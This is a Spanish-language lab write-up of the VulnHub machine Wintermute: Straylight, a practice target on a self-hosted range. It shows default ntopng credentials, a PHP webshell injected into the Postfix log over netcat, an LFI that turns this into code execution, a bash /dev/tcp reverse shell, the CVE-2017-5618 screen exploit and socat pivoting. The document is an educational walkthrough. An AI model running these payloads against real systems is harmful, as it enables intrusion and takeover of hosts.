---
title: "Wintermute: Straylight"
date: 2026-10-27
categories: [VulnHub, Medium]
tags: [linux, smtp, log poisoning, LFI, RCE, default credentials, ntopng, SUID, screen, cve-2017-5618, pivoting, port forwarding, privilege escalation, arp-scan, nmap, whatweb, curl, netcat, searchsploit, socat, python, ssh]
image:
  path: /assets/img/VulnHub/Wintermute-Straylight/banner.webp
  lqip: "data:image/webp;base64,UklGRnwAAABXRUJQVlA4IHAAAABwBQCdASogACAAPu1kqU2ppaQiMAgBMB2JZwDE6f/gPJA9O75lgXfone9VSQbHrUauvYwAAP7ugKlbHM7xdvE7XqXHhi85b5v0o93+Ehjzw70+JCQpVhoVeVi6ZhkAJ1gC5dEyRRiMfBH8ARXAVYAA"
  alt: "Wintermute: Straylight writeup"
lab:
  name: Wintermute
  order: 1
---

Straylight es el punto de entrada de **Wintermute: 1**, un laboratorio de pivoting de dos máquinas de **VulnHub** que tengo en mi rango autohospedado del eJPTv2. Es el único host que mi red de ataque puede siquiera ver; su gemela, [Neuromancer](/es/posts/wintermute-neuromancer/), vive en una red interna aislada accesible *solo* a través de esta máquina. Straylight por sí sola es una cadena limpia — las credenciales por defecto de **ntopng** filtran un endpoint oculto `turing-bolo`, una **LFI** ahí se convierte en RCE vía **log poisoning por SMTP** (una webshell PHP entregada a mano dentro de un email con `netcat`) para una shell de `www-data`, y un **GNU Screen 4.5.0** SUID (**CVE-2017-5618**) da root — y luego se convierte en el punto de lanzamiento del pivot hacia la red interna. El pivoting es el corazón de este laboratorio, así que es lo que más detalle recibe, y mis propios scripts y sesiones están conservados en su totalidad.

| Campo      | Detalles       |
|------------|----------------|
| Plataforma | VulnHub        |
| Dificultad | Medium         |
| SO         | Linux          |
| IP         | 192.168.57.6 (host-only) · 10.0.0.100 (interna) |
| Descarga   | [Wintermute: 1](https://www.vulnhub.com/entry/wintermute-1,239/) |
| Fecha      | Octubre 2026   |

## Herramientas Usadas

| Herramienta | Descripción                                                           |
|-------------|-----------------------------------------------------------------------|
| arp-scan    | Descubrió los hosts del laboratorio en la red host-only              |
| nmap        | Escaneo de puertos y fingerprinting de servicios                     |
| whatweb     | Fingerprinting web (ntopng en el `:3000`)                            |
| curl        | Manejó la LFI y disparó la webshell                                  |
| netcat (nc) | Envió a mano el email SMTP del log poisoning, y los listeners        |
| searchsploit| Localizó el exploit de `screen`                                     |
| socat       | El pivot — reenvió los puertos internos de Neuromancer a través de este host |
| Python      | `http.server` para servir el script del exploit                     |
| ssh         | Acceso estable como root y persistencia                             |

## Montaje del Laboratorio

Todas las VMs corren en VirtualBox con dos redes: un adaptador **host-only** (`vboxnet1`, `192.168.57.0/24` — mi host es el `.1`) que alcanza a la primera máquina, y una red **interna** (`intnet`, `10.0.0.0/24`, DHCP) que solo ven las VMs. Esa red interna es toda la clave — [Neuromancer](/es/posts/wintermute-neuromancer/) vive ahí, invisible desde mi host hasta que tunelizo a través de Straylight. Un `arp-scan` por el lado host-only encuentra a Straylight en **192.168.57.6**:

```bash
sudo arp-scan -I vboxnet1 --localnet
# 192.168.57.6   08:00:27:20:83:27   PCS Systemtechnik GmbH   (straylight)
```

## Reconocimiento y Enumeración

```bash
sudo nmap -p- -sCV 192.168.57.6 -oN nmap
```

```bash
PORT     STATE SERVICE  VERSION
25/tcp   open  smtp     Postfix smtpd   (hostname: straylight; VRFY activado)
80/tcp   open  http     Apache httpd 2.4.25 ((Debian))   (title: Night City)
3000/tcp open  http     ntopng   (title: Welcome to ntopng)
```

Tres servicios: **SMTP** (Postfix), un sitio Apache, y **ntopng** (un monitor de tráfico de red) en el 3000. ntopng viene con credenciales por defecto conocidas — **`admin:admin`** funciona — y dentro de su dashboard de tráfico (`flows_stats.lua`) hay un flujo revelador: una petición local a `http://127.0.0.1:80/turing-bolo/`. Esa es una ruta que nunca habríamos encontrado con fuzzing, nos la entrega la propia herramienta de monitorización.

### La LFI en turing-bolo

`/turing-bolo/bolo.php` toma un parámetro **`bolo`** que selecciona qué log de actividad mostrar — lee la ruta dada y la renderiza. Darle una ruta absoluta lo convierte en una **Local File Inclusion**. El fichero más útil al que apuntar es el log de correo de Postfix, porque podemos *escribir* en ese log remotamente enviando correo:

```bash
curl -s 'http://192.168.57.6/turing-bolo/bolo.php?bolo=/var/log/mail'
# ... renderiza el log de correo de Postfix completo en la página ...
```

Crucialmente, `bolo.php` **incluye** el fichero como PHP, no solo lo imprime — así que si conseguimos meter código PHP *dentro* de un fichero que lee, ese código se ejecuta.

## Acceso Inicial — Log Poisoning por SMTP → RCE como `www-data`

### Envenenar el log de correo con netcat

Esta es la técnica clave: Postfix registra el **asunto** de cada correo que procesa en `/var/log/mail`. Si el asunto contiene PHP, ese PHP acaba en el log — que `bolo.php` luego ejecuta. Así que hablo SMTP a mano con `netcat` y pongo una webshell en la línea del asunto:

```bash
nc -nv 192.168.57.6 25
```

```text
220 straylight ESMTP Postfix (Debian/GNU)
HELO ander
250 straylight
mail from: ander@ander.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <pre> <?php system($_GET['cmd']); ?> </pre>
data2
.
250 2.0.0 Ok: queued as 9AB7F2DDA
```

Paso a paso: `HELO` abre la sesión, `mail from:` / `rcpt to:` fijan un remitente (desechable) y un destinatario local válido (`root`), `data` empieza el mensaje, la línea **`subject:`** lleva el payload PHP, una línea de cuerpo, y un único `.` en su propia línea termina el mensaje. Postfix lo acepta y lo encola — y escribe ese asunto en el log de correo.

Ahora el log contiene `<?php system($_GET['cmd']); ?>`. Pedir el log a través de `bolo.php` lo ejecuta, y el parámetro `cmd` se convierte en ejecución de comandos arbitraria:

```bash
curl -s 'http://192.168.57.6/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=id'
# ... la página ahora muestra: uid=33(www-data) gid=33(www-data) ...
```

### Reverse shell

Con el RCE confirmado, codifico en URL una reverse shell de Bash en el parámetro `cmd` (`%20`=espacio, `%26`=`&`, `%2F`=`/`) y la recibo:

```bash
# listener
nc -nlvp 4444
```

```bash
curl -s 'http://192.168.57.6/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.57.1%2F4444%200%3E%261%27'
```

```bash
Connection received on 192.168.57.6 42208
www-data@straylight:/var/www/html/turing-bolo$
```

Una shell como **`www-data`**; tras el habitual tratamiento de la TTY, a por la escalada.

## Escalada de Privilegios — `www-data` → `root` (SUID `screen 4.5.0` CVE-2017-5618)

La búsqueda de SUID devuelve un binario muy concreto y muy antiguo:

```bash
www-data@straylight:/$ find / -perm -4000 2>/dev/null
/bin/screen-4.5.0
```

**GNU Screen 4.5.0** es vulnerable a **CVE-2017-5618** — maneja mal una ruta de logfile suministrada por el usuario mientras tiene privilegios de root, permitiendo a un atacante escribir un `/etc/ld.so.preload` propiedad de root y cargar una librería compartida maliciosa en un proceso root. Exploit-DB trae un script ya hecho (41154):

```bash
searchsploit -m linux/local/41154.sh
python3 -m http.server       # servirlo desde el host
```

```bash
www-data@straylight:/tmp$ curl -s http://192.168.57.1:8000/privEsc.sh -o privEsc.sh
www-data@straylight:/tmp$ chmod +x privEsc.sh && ./privEsc.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
# whoami
root
# cat /root/flag.txt
REDACTED
```

Root en Straylight. `/root/note.txt` es la miga de pan del pivot — menciona a una usuaria **Lady 3Jane**, una app Java a medida en el servidor de **Neuromancer**, y un despliegue de Tomcat en **`/struts2_2.3.15.1-showcase`**, en una *red interna de administración*.

## Pivoting hacia Neuromancer

### Una segunda interfaz

Ya como root en Straylight, sus interfaces revelan el doble alojamiento que hace de esta máquina un laboratorio de pivot — está en la red host-only *y* en una interna `10.0.0.0/24`:

```bash
root@straylight:/$ ip a
# enp0s3: inet 192.168.57.6/24   (accesible desde mi host)
# enp0s8: inet 10.0.0.100/24     (red solo interna)
```

Mi host no puede rutar a `10.0.0.0/24`; Straylight es el único puente. Un barrido de ping desde Straylight encuentra un vecino:

```bash
root@straylight:/$ for i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i >/dev/null && echo "10.0.0.$i up"; done
# 10.0.0.1 up
# 10.0.0.100 up   (la propia straylight)
# 10.0.0.101 up   (neuromancer)
```

Un escaneo rápido de puertos con Bash `/dev/tcp` de **10.0.0.101** (no hay nmap en la máquina) muestra tres puertos:

```bash
# 8009 (ajp13)   8080 (Tomcat)   34483 (SSH)
```

### socat: reenviar los servicios internos hacia fuera

Aquí está el núcleo del pivot. Straylight puede alcanzar a Neuromancer; mi host puede alcanzar a Straylight; así que hago que **Straylight retransmita** cada puerto de Neuromancer de vuelta hacia mi lado. `socat tcp-listen:<puerto>,fork tcp-connect:10.0.0.101:<puerto>` hace que Straylight escuche en un puerto (en su interfaz `192.168.57.6`, entre otras) y reenvíe cada conexión a Neuromancer:

```bash
root@straylight:/tmp$ socat tcp-listen:8080,reuseaddr,fork tcp-connect:10.0.0.101:8080 &
root@straylight:/tmp$ socat tcp-listen:8009,reuseaddr,fork tcp-connect:10.0.0.101:8009 &
root@straylight:/tmp$ socat tcp-listen:34483,reuseaddr,fork tcp-connect:10.0.0.101:34483 &
```

Ahora, desde mi host, pegarle a `192.168.57.6:8080` en realidad alcanza al **Tomcat de Neuromancer** — puedo escanear y explotar la máquina oculta como si fuera local:

```bash
sudo nmap -p8080,8009,34483 -sCV 192.168.57.6 -oN nmap2
# 8009  ajp13   Apache Jserv (v1.3)
# 8080  http    Apache Tomcat 9.0.0.M26
# 34483 ssh     OpenSSH 7.2p2 Ubuntu
```

Con esos relays corriendo, el resto del laboratorio ocurre contra la máquina oculta — continúa en el writeup de **[Neuromancer](/es/posts/wintermute-neuromancer/)**.

## Prueba de Root

| Host       | Fichero          | Prueba     |
|------------|------------------|------------|
| straylight | `/root/flag.txt` | `REDACTED` |

## Conclusiones Clave

- **Las herramientas de monitorización filtran estructura interna.** ntopng con `admin:admin` no solo concedió un login — su dashboard de tráfico reveló el endpoint interno `turing-bolo` que era toda la superficie de ataque web. Las credenciales por defecto en una herramienta de observabilidad le entregan a un atacante un mapa del host.
- **El log poisoning por SMTP es el compañero clásico de la LFI.** Cuando una LFI *incluye* un fichero como código y puedes escribir en un log (correo, SSH, Apache), tienes RCE. Enviar el payload a mano por `netcat` — PHP en el `subject:` del correo — es una técnica que conviene dominar; no necesita subida, solo un destinatario válido.
- **Un host con doble interfaz es una pasarela.** En cuanto `ip a` mostró una segunda NIC en `10.0.0.0/24`, Straylight dejó de ser el objetivo y pasó a ser la *ruta* hacia [Neuromancer](/es/posts/wintermute-neuromancer/). Enumera todas las interfaces de cada host que controles; una segunda NIC silenciosa es justo el sentido de un laboratorio de pivot.
- **El pivoting es solo retransmitir conexiones.** `socat tcp-listen:X,fork tcp-connect:10.0.0.101:X` reenvió los servicios de Neuromancer *hacia fuera* para poder atacarlos desde mi host como si fueran locales. Tener claro quién puede alcanzar a quién es toda la habilidad — y la dirección inversa (recuperar una shell) es donde arranca [Neuromancer](/es/posts/wintermute-neuromancer/).
